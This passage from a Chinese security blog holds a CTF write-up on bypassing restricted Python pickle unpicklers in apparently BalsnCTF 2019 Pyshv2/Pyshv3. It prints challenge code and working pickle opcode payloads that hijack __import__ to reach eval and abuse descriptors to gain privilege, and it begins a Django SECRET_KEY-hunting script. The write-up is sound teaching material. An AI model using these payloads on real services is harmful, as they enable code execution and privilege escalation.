class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;structs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">&#x27;help&#x27;</span>: self.cmd_help,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Available commands: &#x27;</span> + <span class="string">&#x27; &#x27;</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>



<p>这次更骚了直接给了个空模块</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; dir(structs)</span></span><br><span class="line">[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;]</span><br></pre></td></tr></table></figure>



<p><code>__spec__,__loader__,__builtins__</code>是我们需要注意的</p>
<p>我们看一下操作码c(看重载后的find_class代码,看别人wp的时候没看重载后的find_class,然后连wp都看不懂了)的实现,发现调用了<code>__import__</code></p>
<p>在文档中发现</p>
<blockquote>
<p>此函数(<code>__import__</code>)会由 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义 </p>
</blockquote>
<p>而<code>__buiutins__</code>里面也有<code>__import__</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; structs.__builtins__[&#x27;__import__&#x27;]=eval</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: eval expected at most 3 arguments, got 5</span><br><span class="line">&gt;&gt;&gt; __import__(&#x27;print(123)&#x27;)</span><br><span class="line">123</span><br></pre></td></tr></table></figure>



<p>成功修改了<code>__import__</code></p>
<p>我们再看重载的find_class</p>
<p>securePickle.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        module = <span class="built_in">__import__</span>(module)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(module, name)</span><br><span class="line"><span class="comment">#一般重载都会改成if xxxx : raise xxxx else:  return pickle.Unpickler.find_class(self, module, name)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而原来的find_class是这样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span>:</span></span><br><span class="line">    <span class="built_in">__import__</span>(module, level=<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure>



<p>接着我们可以通过操作码c来实现一下操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">getattr</span>(<span class="built_in">__import__</span>(module), name)</span><br></pre></td></tr></table></figure>

<p>如果能令<code>__import__(module)</code>的返回值为<code>__builtins__</code>时,就可以取出<code>__builtins__</code>里的值</p>
<p>结合<a target="_blank" rel="noopener" href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id1">魔术方法</a><code>__getattribute__</code>便可以实现</p>
<p>于是构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bis=structs.__builtins__</span><br><span class="line">structs.__setattr__(<span class="string">&#x27;structs&#x27;</span>,bis)<span class="comment">#name只能为structs</span></span><br><span class="line">bis[<span class="string">&#x27;__import__&#x27;</span>]=structs.__getattribute__</span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;structs&quot;</span>),<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;eval&quot;</span>)(<span class="string">&quot;print(123)&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>对应的pickle代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">__builtins__</span><br><span class="line">p100</span><br><span class="line">0cstructs</span><br><span class="line">__setattr__</span><br><span class="line">(S&#x27;structs&#x27;</span><br><span class="line">g100</span><br><span class="line">tRg100</span><br><span class="line">S&#x27;__import__&#x27;</span><br><span class="line">cstructs</span><br><span class="line">__getattribute__</span><br><span class="line">scstructs</span><br><span class="line">get</span><br><span class="line">(S&quot;eval&quot;</span><br><span class="line">tR(S&#x27;print(123)&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>







<h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><p>structs.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, group</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br></pre></td></tr></table></figure>



<p>server.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;structs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.key = os.urandom(<span class="number">100</span>)</span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">&#x27;help&#x27;</span>: self.cmd_help,</span><br><span class="line">            <span class="string">&#x27;whoami&#x27;</span>: self.cmd_whoami,</span><br><span class="line">            <span class="string">&#x27;su&#x27;</span>: self.cmd_su,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">        flag = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(self.key, flag))</span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Login as &#x27;</span> + user.name + <span class="string">&#x27; - &#x27;</span> + user.group)</span><br><span class="line">        user.privileged = <span class="literal">False</span></span><br><span class="line">        user.flag = flag</span><br><span class="line">        self.user = user</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Available commands: &#x27;</span> + <span class="string">&#x27; &#x27;</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_whoami</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.user.name, self.user.group)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.user.privileged:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;flag: Permission denied&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(self.user.flag, self.key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>



<p>如果我们想拿到flag,要么命令执行直接拿flag要么就令<code>user.privileged=True</code> 调用cmd_flag来拿flag</p>
<p>但是再反序列化处</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user = pickle.loads(user)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;Login as &#x27;</span> + user.name + <span class="string">&#x27; - &#x27;</span> + user.group)</span><br><span class="line">      user.privileged = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><code>user.privileged</code>会被覆盖为False,再康康其他的信息把</p>
<p><code>dir(structs)</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;User&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>]</span><br></pre></td></tr></table></figure>

<hr>
<p>几个小时后,看wp学成归来.</p>
<p>我:艹,太骚了,师傅们牛逼死了</p>
<hr>
<p>之前说有两个解题思路,命令执行这一个思路在看了一会之后就觉得不太行,毫无头绪</p>
<p>再康康让<code>user.privileged=False</code>失效这一思路,emmmm感觉也不太行.</p>
<p>但是,类的赋值肯定会受到一些特殊函数的影响</p>
<p>在研究类的赋值的时候可以找到<a target="_blank" rel="noopener" href="https://foofish.net/what-is-descriptor-in-python.html">描述符</a>可以自定义赋值函数</p>
<p>那么如果我们能让User的<code>__set__</code>变成一个接受3个参数的函数,就可以令<code>user.privileged=False</code>无效</p>
<p>但是很显然pickle里是无法直接编写代码的,令<code>__set__=&quot;&quot;</code>?更不行,会直接报错</p>
<p>继续阅读代码我们会发现一个神奇的东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, group</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;name:%s ,group:%s&quot;</span>%(name,group))</span><br></pre></td></tr></table></figure>

<p><code>User.__init__</code>刚好接受三个参数</p>
<p>我们能不能让<code>__set__=User</code>?,然后调用<code>__set__</code>的时候调用<code>User.__init__</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(User,<span class="string">&#x27;test&#x27;</span>,User(<span class="number">123</span>,<span class="number">123</span>))</span><br><span class="line">name:<span class="number">123</span> ,group:<span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(User,<span class="string">&quot;__set__&quot;</span>,User)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b=User(<span class="number">123</span>,<span class="number">123</span>)</span><br><span class="line">name:<span class="number">123</span> ,group:<span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.test=<span class="number">123123</span></span><br><span class="line">name:&lt;structs.User <span class="built_in">object</span> at <span class="number">0x0000017BA1538748</span>&gt; ,group:<span class="number">123123</span></span><br></pre></td></tr></table></figure>



<p>于是构造:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">__import__</span>(<span class="string">&quot;structs&quot;</span>).User</span><br><span class="line">b=User(<span class="string">&quot;123&quot;</span>,<span class="string">&quot;456&quot;</span>)</span><br><span class="line"><span class="built_in">setattr</span>(a,<span class="string">&quot;privileged&quot;</span>,b)</span><br><span class="line"><span class="built_in">setattr</span>(a,<span class="string">&quot;__set__&quot;</span>,a)</span><br><span class="line"><span class="keyword">return</span> b</span><br></pre></td></tr></table></figure>

<p>对应的pickle代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">User</span><br><span class="line">p100</span><br><span class="line">(S&quot;123&quot;</span><br><span class="line">S&quot;456&quot;</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">(N&#125;S&#x27;privileged&#x27;</span><br><span class="line">g101</span><br><span class="line">sS&#x27;__set__&#x27;</span><br><span class="line">g100</span><br><span class="line">stbg101</span><br><span class="line">.</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ help</span><br><span class="line">Available commands: help whoami su flag</span><br><span class="line">$ whoami</span><br><span class="line">123 456</span><br><span class="line">$ flag</span><br><span class="line">b&#x27;Balsn&#123;pY7h0n1dae_ObJ3c7&#125;\n&#x27;</span><br></pre></td></tr></table></figure>

<p>hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a> </p>
<p> <a target="_blank" rel="noopener" href="http://www.polaris-lab.com/index.php/archives/178/">http://www.polaris-lab.com/index.php/archives/178/</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a> </p>
<p> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5306">https://xz.aliyun.com/t/5306</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2019/12/26/pickle/" data-id="cku8k8fyn005sd0obcoze1edg" data-title="python  pickle 入门" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-django快速查找配置" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/20/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" class="article-date">
  <time class="dt-published" datetime="2019-12-20T16:00:00.000Z" itemprop="datePublished">2019-12-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/20/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/">django快速查找配置</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="django快速查找配置"><a href="#django快速查找配置" class="headerlink" title="django快速查找配置"></a>django快速查找配置</h1><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>在看p牛的picklecode wp的时候卡在secret_key查找那边</p>
<p>看到p牛一句很容易,人就傻掉了</p>
<p><img src="https://i.loli.net/2019/12/21/8mnp5l7ODuPkBQo.png" alt="image209"></p>
<p>花了一天时间(踩了个坑),写了个快速查找secret_key的脚本</p>
<p>代码写的不太好,自己改改用吧////</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http.response <span class="keyword">import</span> HttpResponse, HttpResponseRedirect</span><br><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> engines</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> login <span class="keyword">as</span> auth_login, get_user_model, authenticate</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.views <span class="keyword">import</span> LoginView, logout_then_login</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.decorators <span class="keyword">import</span> login_required</span><br><span class="line"><span class="keyword">from</span> django.views <span class="keyword">import</span> generic</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> template</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> template</span><br><span class="line">register = template.Library()</span><br><span class="line"></span><br><span class="line"><span class="meta">@register.filter</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dict</span>(<span class="params">obj,way=<span class="string">&quot;&quot;</span>,depth=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> depth&gt;<span class="number">11</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    objdir=<span class="built_in">dir</span>(obj)</span><br><span class="line">    r=&#123;<span class="string">&quot;dict&quot;</span>:objdir,<span class="string">&quot;way&quot;</span>:way&#125;</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> objdir:            </span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            <span class="keyword">if</span> <span 